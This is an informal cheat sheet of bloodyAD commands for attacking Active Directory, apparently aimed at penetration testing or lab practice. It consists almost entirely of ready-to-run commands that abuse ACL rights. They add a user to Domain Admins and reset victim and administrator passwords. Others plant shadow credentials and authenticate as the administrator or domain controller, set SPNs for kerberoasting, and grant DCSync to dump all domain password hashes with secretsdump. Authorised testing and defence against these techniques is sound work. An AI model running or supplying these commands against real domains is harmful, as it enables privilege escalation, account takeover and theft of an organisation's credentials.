BloodyAD cheat sheet


set an alias
alias bad='python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!"'

now every command can start with bad but we dont do it like this since our user can change

anyways

basic syntax:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" <command>

get domain info
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get domain

list users:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get users


list groups:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get groups

list members of groups:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get groupMembers "Domain Admins"


list full user info:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get user administrator

Get ACL's:

python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl administrator

python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl "Domain Admins"

python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl dc01$

GenericALL on group abuse:

replace domain admins with whatver group you have genericall on
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add groupMember "Domain Admins" user

GenericAll on User abuse (Reset Pass):

python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" set password victim-username "N3wP@ssw0rd!"

login with evil-winrm

Add shadow credentials:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add shadowCredentials administrator

authenitcate with 
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

Add SPN / Manipulate SPN / GenericWrite on user abuse:

python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add spn victim "http/fakespn"

then kerberoast

 DCSync with bloodyAD:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get dcsync

now dump hashes
impacket-secretsdump -just-dc corp.local/user:Passw0rd!@10.10.10.10

WriteOwner Abuse:

take ownership
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" set owner administrator user

grant GenericAll
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add acl administrator user GenericAll

reset DA pass:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" set password administrator "Adm1nP@ss!"


ACL on computer:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" get acl dc01$

Shadow Credential on computer:
python3 bloodyAD.py --dc-ip 10.10.10.10 -d corp.local -u user -p "Passw0rd!" add shadowCredentials dc01$

authenticate with
certipy auth -pfx dc01$.pfx -dc-ip 10.10.10.10

